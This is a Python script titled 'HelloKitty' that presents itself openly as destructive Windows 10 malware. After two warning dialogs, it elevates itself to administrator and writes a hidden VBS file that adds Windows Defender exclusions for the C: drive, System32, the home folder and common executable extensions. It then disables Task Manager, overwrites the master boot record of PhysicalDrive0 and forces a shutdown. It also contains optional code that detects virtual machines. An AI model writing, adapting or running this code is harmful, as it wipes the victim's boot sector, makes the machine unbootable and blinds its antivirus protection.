###############################################################
####                  Made By DerKeks8141                  ####
###############################################################

import os
import sys
import platform
if os.name != "nt":
    sys.exit()
if platform.release() != '10':
    sys.exit()
from pathlib import Path
from tkinter import messagebox
import psutil
import time
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
import win32comext.shell.shell as shell
ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

#Pin file
DontDownloadPath = str(Path.home()) + "\\AppData\\Local\\Temp\\djj012ndawm10d9wadaw.txt"

#System Paths
TempPath = str(Path.home()) + "\\AppData\\Local\\Temp"

def Warning():
    #Warning message
    if messagebox.askyesno("HelloKitty", "WARNING: This program is a real virus and will destroy your PC. Are you sure you want to start it?", icon="warning"):
        if messagebox.askyesno("HelloKitty", "LAST-WARNING: Are you really sure you want to start this program? After that there is no turning back!", icon="warning"):
            Installation()

def Installation():
    #Look for the file, and when its found, the program quits
    if not os.path.isfile(DontDownloadPath) == True:
        DTM()

        os.chdir(TempPath)

        #WindowsDefender "Bypass"
        text_file = open("val.vbs", "w")
        text_file.write(f'''
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\DWD.exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\WindowsDefender.exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'vbs'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'dll'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:\Windows'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:\Windows\System32'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath {str(Path.home())}", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Local\Temp'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Roaming'", 0, True
        ''')       
        text_file.close()

        time.sleep(2)

        os.system("attrib +h " + 'val.vbs')

        os.system("start val.vbs")

        os.system("echo > djj012ndawm10d9wadaw.txt")

        DelMBR()

def AntiVm():
  #Searches for processes with the name, and when he has found a process, the program quits
  Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
  for process in psutil.process_iter():
      for i in Process:
        if i in process.name().lower():
            return CommitSuicide()

def CommitSuicide():
  sys.exit()

def DelMBR():
    #Overwrite MBR
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
    WriteFile(hDevice, AllocateReadBuffer(512), None)
    CloseHandle(hDevice)

    os.system("shutdown -s -f -t 0")

def DTM():
    try:
        #Block Task-Manager
        os.system("start cmd /c REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    except:
        pass

if __name__ == '__main__':
    #AntiVm() Optional
    Warning()
